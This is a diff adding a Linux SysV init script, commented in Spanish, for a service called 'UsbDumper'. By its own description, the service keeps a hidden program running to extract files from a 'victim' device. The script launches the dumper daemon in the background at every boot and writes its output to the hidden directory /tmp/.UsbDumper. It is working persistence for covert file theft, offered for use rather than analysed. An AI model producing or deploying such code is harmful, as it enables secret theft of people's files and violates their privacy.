@@ -1,0 +1,75 @@
+#!/bin/bash
+
+### BEGIN INIT INFO
+# Provides: UsbDumper
+# Required-Start: $local_fs $remote_fs
+# Required-Stop: 
+# Default-Start: 2 3 4 5
+# Default-Stop: 0 1 6
+# Short-Description: Simple UsbDumper para extraer archivos
+# Description: El servicio UsbDumper se encarga de mantener
+#              oculto el programa "UsbDumper" para extraer
+#              los archivos del dispositivo victima.
+### END INIT INFO
+
+. /lib/lsb/init-functions
+
+set -e
+
+DAEMON=/usr/bin/UsbDumper
+NAME=$(basename $DAEMON)
+OUTDIR=/tmp/.$NAME
+
+case $1 in
+	start)
+		log_daemon_msg "Iniciando $NAME ..." "$NAME"
+		start-stop-daemon --start --verbose --oknodo --background --exec $DAEMON -- -o $OUTDIR
+		log_success_msg "$NAME se ha iniciado correctamente" "$NAME"
+		log_end_msg $?
+
+	;;
+
+	stop)
+		log_daemon_msg "$NAME se está apagando ..." "$NAME"
+		start-stop-daemon --stop --verbose --quiet --oknodo --exec $DAEMON
+		log_success_msg "$NAME se apago correctamente" "$NAME"
+		log_end_msg $?
+
+	;;
+
+	restart|reload|force-reload)
+		log_daemon_msg "Reiniciando..." "$NAME"
+		$0 stop && sleep 1 && $0 start
+		log_success_msg "$NAME se ha reiniciado satisfactoriamente" "$NAME"
+
+	;;
+
+	try-restart)
+		log_daemon_msg "Reinintenado el reiniciado ..." "$NAME"
+
+		if $0 status >/dev/null;then
+			$0 restart
+			log_success_msg "¡$NAME se ha reiniciado correctamente!" "$NAME"
+			log_end_msg $?
+
+		else
+			log_failure_msg "¡$NAME no se pudo reiniciar!"
+			exit 0
+
+		fi
+
+	;;
+
+	status)
+		status_of_proc "$DAEMON" "$NAME"
+
+	;;
+
+	*)
+		echo "Usage: $0 {start|stop|restart|reload|force-reload|try-restart|status}"
+
+	;;
+
+esac
+
+exit 0
